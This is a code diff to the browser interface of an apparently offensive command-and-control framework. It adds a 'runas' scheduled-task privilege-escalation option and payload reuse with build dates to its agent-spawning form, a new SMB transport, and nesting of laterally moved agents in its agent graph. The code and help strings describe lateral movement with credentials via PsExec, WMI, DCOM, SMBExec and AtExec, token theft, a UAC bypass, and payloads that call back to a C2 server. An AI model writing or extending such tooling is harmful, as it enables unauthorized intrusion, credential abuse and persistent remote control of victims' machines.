@@ -3063,14 +3063,15 @@ function qfFillCred(credId) {
   if (pField) pField.value = c.secret||'';
 }
 
-function showQuickForm(title, fields, onSubmit) {
+function showQuickForm(title, fields, onSubmit, postRender) {
   const f = document.getElementById('ctx-quick-form');
   let html = `<h4>${esc(title)}</h4>`;
   fields.forEach(fd => {
     const rowCls = fd.type === 'cred-pick' ? 'qf-row qf-cred-pick' : 'qf-row';
     html += `<div class="${rowCls}"><label>${esc(fd.label)}</label>`;
     if (fd.type === 'select') {
-      html += `<select id="qf_${fd.key}">${fd.options.map(o=>`<option value="${esc(o.v)}">${esc(o.l)}</option>`).join('')}</select>`;
+      const onch = fd.onChange ? ` onchange="${esc(fd.onChange)}"` : '';
+      html += `<select id="qf_${fd.key}"${onch}>${fd.options.map(o=>`<option value="${esc(o.v)}">${esc(o.l)}</option>`).join('')}</select>`;
     } else if (fd.type === 'select-grouped') {
       const grpHtml = fd.groups.map(g => {
         if (!g.items.length) return '';
@@ -3111,6 +3112,11 @@ function showQuickForm(title, fields, onSubmit) {
   f.style.top  = Math.max(8, Math.min(vh - 320, vh/2 - 120)) + 'px';
   setTimeout(() => f.querySelector('input,select')?.focus(), 40);
   f.addEventListener('keydown', _qfKeydown);
+  if (postRender) setTimeout(postRender, 0);
+}
+function qfToggleTransport(payloadVal) {
+  const row = document.getElementById('qf_transport')?.closest('.qf-row');
+  if (row) row.style.display = payloadVal ? 'none' : '';
 }
 function _qfKeydown(e) {
   if (e.key === 'Enter') submitQuickForm();
@@ -3853,11 +3859,14 @@ async function runCtxAction(act) {
         const agnt = agents.find(a => a.id === aid);
         // Load available payloads for reuse
         const [artifactR, uploadR] = await Promise.all([api('GET','/api/artifacts'), api('GET','/api/uploads')]);
-        const artifacts   = (artifactR?.ok ? artifactR.data||[] : []).filter(f => f.filename?.match(/\.(exe|bin)$/i));
+        const artifacts   = (artifactR?.ok ? artifactR.data||[] : [])
+          .filter(f => f.filename?.match(/\.(exe|bin)$/i))
+          .sort((a,b) => (b.created_at||'').localeCompare(a.created_at||''));
         const uploadFiles = (uploadR?.ok  ? uploadR.data||[]  : []).filter(f => f.filename?.match(/\.(exe|bin)$/i) && !f.agent_id);
         const artifactNames = new Set(artifacts.map(f => f.filename));
+        const fmtDate = s => { try { return new Date(s).toLocaleDateString(undefined,{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'}); } catch(_){return '';} };
         const payloadItems  = [{v:'', l:'🆕 Build new (auto)'}]
-          .concat(artifacts.map(f=>({v:f.filename,l:f.filename})))
+          .concat(artifacts.map(f=>({v:f.filename, l:`${f.filename}  (${fmtDate(f.created_at)})`})))
           .concat(uploadFiles.filter(f=>!artifactNames.has(f.filename)).map(f=>({v:f.filename,l:f.filename})));
 
         showQuickForm('🚀 Spawn Agent as User', [
@@ -3865,18 +3874,21 @@ async function runCtxAction(act) {
           {key:'user',      label:'Username',       def:'', ph:'.\\localuser  /  CORP\\admin'},
           {key:'pass',      label:'Password',       type:'password', ph:''},
           {key:'method',    label:'Deploy via',     type:'select', options:[
-            {v:'wmi',     l:'WMI (Win32_Process)'},
-            {v:'atexec',  l:'AtExec (Task Scheduler)'},
-            {v:'smbexec', l:'SMBExec (cmd service)'},
-            {v:'psexec',  l:'PSExec (SCM service)'},
-            {v:'dcom',    l:'DCOM (MMC20)'},
+            {v:'runas',   l:'RunAs  (local schtasks — privesc mismo host)'},
+            {v:'dcom',    l:'DCOM   (MMC20 — local/remote)'},
+            {v:'wmi',     l:'WMI    (Win32_Process — solo remoto)'},
+            {v:'atexec',  l:'AtExec (Task Scheduler — solo remoto)'},
+            {v:'smbexec', l:'SMBExec (cmd service — solo remoto)'},
+            {v:'psexec',  l:'PSExec  (SCM service — solo remoto)'},
           ]},
-          {key:'transport', label:'Payload transport', type:'select', options:[
+          {key:'payload',   label:'Payload (exe)',   type:'select', options: payloadItems,
+           onChange: 'qfToggleTransport(this.value)'},
+          {key:'transport', label:'Build transport', type:'select', options:[
             {v:'http',  l:'HTTP  (port 8080)'},
-            {v:'https', l:'HTTPS (port 8443)'},
+            {v:'https', l:'HTTPS (port 443)'},
             {v:'tcp',   l:'TCP   (port 4444)'},
+            {v:'smb',   l:'SMB   (named pipe)'},
           ]},
-          {key:'payload',   label:'Payload (exe)',   type:'select', options: payloadItems},
         ], async vals => {
           if (!vals.user) { toast('Username required','red'); return; }
 
@@ -3888,7 +3900,7 @@ async function runCtxAction(act) {
             const outName = `agent_priv_${suffix}.exe`;
             const c2host  = c2IPs[0] || (() => { try { return new URL(BASE).hostname; } catch(_){return '127.0.0.1';} })();
             const transport = vals.transport || 'http';
-            const portMap   = {http:'8080', https:'8443', tcp:'4444'};
+            const portMap   = {http:'8080', https:'443', tcp:'4444'};
             const scheme    = transport === 'tcp' ? 'tcp' : transport;
             const serverURL = `${scheme}://${c2host}:${portMap[transport]||'8080'}`;
             openConsoleFor(aid);
@@ -3918,7 +3930,7 @@ async function runCtxAction(act) {
           const cmdLine = `jump ${vals.method} ${host} ${payloadName} ${vals.user} ${vals.pass}`;
           addConsoleOutputForAgent(aid, `[privesc] → ${cmdLine}`, '', null);
           setTimeout(() => dispatchConsoleCmd(aid, cmdLine), 350);
-        });
+        }, () => qfToggleTransport(document.getElementById('qf_payload')?.value || ''));
       } else if (privAct === 'fodhelper') {
         showQuickForm('⬆️ UAC Bypass (fodhelper)', [
           {key:'cmd', label:'Command to elevate', def:'cmd.exe', ph:'cmd.exe'},
@@ -5256,7 +5268,7 @@ function _drawElbowLR(svg, x1,y1,x2,y2, col, markerId, label, sleepLbl, dead) {
     flow.offsetWidth;
     flow.style.animation = 'graphFlowAnim 0.55s linear infinite';
   }
-  if (label) _drawLinePill(svg, mid, (y1+y2)/2, label, sleepLbl||'', col, !!dead);
+  if (label) _drawLinePill(svg, Math.round((mid+x2)/2), y2, label, sleepLbl||'', col, !!dead);
 }
 function _mkGraphNode(x,y,w,h,opts) {
   const el = document.createElement('div');
@@ -5543,20 +5555,32 @@ function renderAgentTree() {
   const pivots=sorted.filter(a=>isSmb(a));
 
   const childrenOf={}, orphans=[];
+  // SMB pivot children
   pivots.forEach(p=>{
     const par=direct.find(d=>d.id===p.parent_id) || direct.find(d=>d.hostname===p.hostname) || null;
     p._par=par;
     if(par)(childrenOf[par.id]=childrenOf[par.id]||[]).push(p);
     else orphans.push(p);
   });
-
-  // Build RT tree: C2 → direct agents → pivot children
-  const rtRoot=_mkRTN('__c2__');
+  // Non-SMB agents with parent_id set (laterally spawned via jump/shell) nest under their parent
+  const directById={};
+  direct.forEach(a=>directById[a.id]=a);
+  const lateralChildren={}, rootDirect=[];
   direct.forEach(a=>{
+    const par=a.parent_id && directById[a.parent_id] ? directById[a.parent_id] : null;
+    if(par)(lateralChildren[par.id]=lateralChildren[par.id]||[]).push(a);
+    else rootDirect.push(a);
+  });
+
+  // Build RT tree: C2 → root direct agents → pivot+lateral children
+  const rtRoot=_mkRTN('__c2__');
+  function _addDirect(a, parentNode) {
     const rn=_mkRTN(a.id);
     (childrenOf[a.id]||[]).forEach(p=>rn.children.push(_mkRTN(p.id)));
-    rtRoot.children.push(rn);
-  });
+    (lateralChildren[a.id]||[]).forEach(c=>_addDirect(c, rn));
+    parentNode.children.push(rn);
+  }
+  rootDirect.forEach(a=>_addDirect(a, rtRoot));
   orphans.forEach(p=>rtRoot.children.push(_mkRTN(p.id)));
 
   // xStep=DEPTH_STEP controls depth-level spacing; yStep=SIB_STEP controls sibling spacing.
@@ -6244,9 +6268,8 @@ function updateGraphLines() {
       flow.style.animation = 'graphFlowAnim 0.55s linear infinite';
     }
 
-    // Transport + sleep/jitter label pill — midpoint of the horizontal segment to agent,
-    // positioned above the line so the pill doesn't overlap the arrow.
-    const lx      = Math.round((midX + nx) / 2);
+    // Transport + sleep/jitter label pill — true horizontal midpoint between source and agent.
+    const lx      = Math.round((srcX + nx) / 2);
     const label   = transportLabel(a.transport);
     const sleepS  = a.sleep_sec  != null ? a.sleep_sec  : null;
     const jitterP = a.jitter_pct != null ? a.jitter_pct : null;
@@ -7260,7 +7283,7 @@ const AC_COMMANDS = [
   ['winrm exec','winrm exec <t> <u> <p> <cmd>'],
   ['winrm deploy','winrm deploy <t> <u> <p> <cradle>'],
   // ── Lateral movement (stage + exec in one shot) ──────────────────────────
-  ['jump','jump <psexec|wmi|winrm|ssh|dcom|smbexec|atexec> <host> <payload.exe> [user] [pass]'],
+  ['jump','jump <psexec|wmi|winrm|ssh|dcom|smbexec|atexec|runas> <host> <payload.exe> [user] [pass]'],
   ['jump psexec',  'jump psexec  <host> <payload.exe> [DOMAIN\\user] [pass] — SMB admin$ + SCM service (SERVICES→agent)'],
   ['jump wmi',     'jump wmi     <host> <payload.exe> [DOMAIN\\user] [pass] — SMB C$ + WMI Win32_Process::Create'],
   ['jump winrm',   'jump winrm   <host> <payload.exe> [DOMAIN\\user] [pass] — SMB C$ + WinRM Invoke-Command'],
@@ -7268,6 +7291,7 @@ const AC_COMMANDS = [
   ['jump dcom',    'jump dcom    <host> <payload.exe> [DOMAIN\\user] [pass] — SMB + MMC20.Application DCOM'],
   ['jump smbexec', 'jump smbexec <host> <payload.exe> [DOMAIN\\user] [pass] — SMB + cmd.exe service (SERVICES→cmd→agent, sin IOC de binario como servicio)'],
   ['jump atexec',  'jump atexec  <host> <payload.exe> [DOMAIN\\user] [pass] — MS-TSCH scheduled task, runas SYSTEM, se autodestruye (impacket atexec style)'],
+  ['jump runas',   'jump runas   <host> <payload.exe> <user> <pass>         — schtasks privesc: ejecuta payload como usuario local (mismo host)'],
   ['token-store steal','token-store steal <pid> — robar token de proceso y guardar en store'],
   ['token-store use','token-store use <id> — usar token del store'],
   ['token-store show','token-store show — listar tokens guardados'],
@@ -7326,7 +7350,7 @@ const AC_WIN_ONLY = new Set([
   'ishell','ishell cmd','ishell ps','ishell exit',
   'link start','link stop',
   'winrm exec','winrm deploy',
-  'jump','jump psexec','jump wmi','jump winrm','jump ssh','jump dcom','jump smbexec','jump atexec',
+  'jump','jump psexec','jump wmi','jump winrm','jump ssh','jump dcom','jump smbexec','jump atexec','jump runas',
   'hollow','udrl','blockdlls','blockdlls on','blockdlls off',
   'gen-lnk','com-hijack','com-hijack rm',
   'clip-monitor start','clip-monitor dump','clip-monitor stop',
@@ -7727,6 +7751,7 @@ ${isWin ? `
   jump atexec  &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   lateral via ephemeral scheduled task (AT)
   jump ssh     &lt;host&gt; &lt;payload.bin&gt; [user] [pass]   copy + execute via SSH (Linux/Windows)
   jump winrm   &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   copy payload.exe to target and execute via WinRM
+  jump runas   &lt;host&gt; &lt;payload.exe&gt; &lt;user&gt; &lt;pass&gt;   schtasks privesc — ejecuta como usuario local (mismo host)
                                                      (≠ winrm deploy: payload is a pre-uploaded .exe)
   winrm exec   &lt;host&gt; &lt;user&gt; &lt;pass&gt; &lt;cmd&gt;          run a single command on remote host via WinRM
                                                      (no agent deployed — equivalent to wmiexec over WinRM)
@@ -9759,7 +9784,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     case 'jump': {
       const lp = args.trim().split(/\s+/);
       const lMethod = (lp[0] || '').toLowerCase();
-      const validMethods = ['psexec','wmi','winrm','ssh','dcom','smbexec','smb','atexec','at'];
+      const validMethods = ['psexec','wmi','winrm','ssh','dcom','smbexec','smb','atexec','at','runas'];
       if (!validMethods.includes(lMethod) || lp.length < 3) {
         addConsoleOutput(
           'uso: jump <método> <host> <payload.exe> [user] [pass]\n\n' +
@@ -9770,6 +9795,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
           '  wmi     — SMB C$ + WMI Win32_Process::Create\n' +
           '  winrm   — SMB C$ + PowerShell Invoke-Command\n' +
           '  dcom    — SMB + MMC20.Application DCOM ExecuteShellCommand\n' +
+          '  runas   — schtasks local como usuario distinto (privesc mismo host)\n' +
           '  ssh     — SCP upload + SSH exec (Windows → Linux/Unix)\n\n' +
           'Ejemplos:\n' +
           '  jump psexec   10.7.10.22 agent.exe\n' +
@@ -9790,6 +9816,12 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         user:    lp[3] || '',
         pass:    lp.slice(4).join(' ') || '',
       });
+      // Register watcher so spawned agent auto-gets parent_id (lateral move or local privesc)
+      _lateralWatchers[lp[1]] = {
+        parentID: agentID,
+        knownIds: new Set(agents.map(a => a.id)),
+        expiry:   Date.now() + 300000,
+      };
       break;
     }
 
